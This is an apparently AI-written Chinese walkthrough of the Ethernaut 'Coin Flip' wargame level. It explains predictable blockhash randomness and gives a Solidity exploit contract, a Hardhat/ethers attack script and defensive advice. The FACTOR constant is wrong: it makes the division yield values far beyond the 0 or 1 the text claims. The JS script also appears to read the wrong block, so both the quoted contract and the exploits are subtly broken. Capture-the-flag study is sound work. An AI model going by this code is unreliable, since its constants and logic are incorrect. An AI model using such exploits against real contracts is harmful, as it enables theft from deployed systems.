# Ethernaut 关卡: Coin Flip - 题解

## 关卡目标
- 连续猜对若干次硬币正反（达到目标 `consecutiveWins`）

## 合约代码（节选）
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 public lastHash;
    uint256 public constant FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## 漏洞核心
- 随机数来源：`blockhash(block.number - 1)`，这是基于区块信息的**确定性值**，在同一区块内对所有人可见且可预测。
- 计算方式把 `blockValue` 除以一个常量 `FACTOR` 得到 0 或 1，从而决定正反面。由于 `blockhash` 在下一区块内固定，攻击者可以在调用前复现这个计算结果，从而总是猜对。

本质上：合约把可链上复现的值当成不可预测的随机数，导致可被预测并被利用。

## 攻击思路
1. 在发起 `flip` 调用前，读取 `blockhash(block.number - 1)` 并做同样的计算：
   - 计算 `uint256(blockhash(block.number - 1)) / FACTOR`，判断出应该传入 `true` 还是 `false`。
2. 用合约或脚本在每个新区块调用 `flip` 并传入预测的结果，连续获得 `consecutiveWins`。

## 漏洞利用示例

### 利用合约（Solidity）
```solidity
pragma solidity ^0.6.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    ICoinFlip public target;
    uint256 public constant FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    constructor(address _target) public {
        target = ICoinFlip(_target);
    }

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;
        target.flip(side);
    }
}
```

使用方法：部署 `CoinFlipHack` 并在每个新区块调用 `hack()`，它会用与目标合约相同的逻辑计算出正确的猜测值，从而始终猜对。

### 利用脚本（JS - Hardhat / ethers）
```javascript
for (let i = 0; i < 10; i++) {
  // 在新区块对目标合约发起交易前，先在本地计算期望值
  const blockValue = await ethers.provider.getBlockNumber().then(n => ethers.provider.getBlock(n - 1)).then(b => BigInt('0x' + b.hash.slice(2)));
  const coinFlip = blockValue / BigInt(FACTOR);
  const side = coinFlip === BigInt(1);

  await target.flip(side, { gasLimit: 100000 });
  // 等待下一个区块再继续
}
```

（注意：实际脚本中要把常量 `FACTOR` 替换为与目标合约一致的值，并确保每次调用在新的区块中。）

## 防御建议
- 不要使用基于区块数据的简单除法作为随机数源。链上数据对矿工和外部观察者可见且可控（在一定程度上），不能当作安全随机数来源。
- 可采用链下随机（VRF）、链上混合延迟提交-揭示方案，或依赖受信任的预言机（如 Chainlink VRF）。
- 在设计需要不可预测随机数的功能时，考虑矿工操控和重放攻击的风险。

## 关键教训
- 区块哈希并非真正的不可预测随机数来源：在同一链上、短时间内可被观测与利用。
- 对安全关键的“随机”依赖，要使用专门的随机性服务或更为复杂的不可预测方案。

## 参考资源
- [Chainlink VRF](https://docs.chain.link/vrf)
- Ethernaut Coin Flip 关卡讲解（社区文章）

---

如果你希望我把内容改为更详细的逐步脚本、加入截图或把解释更口语化，我可以继续调整。
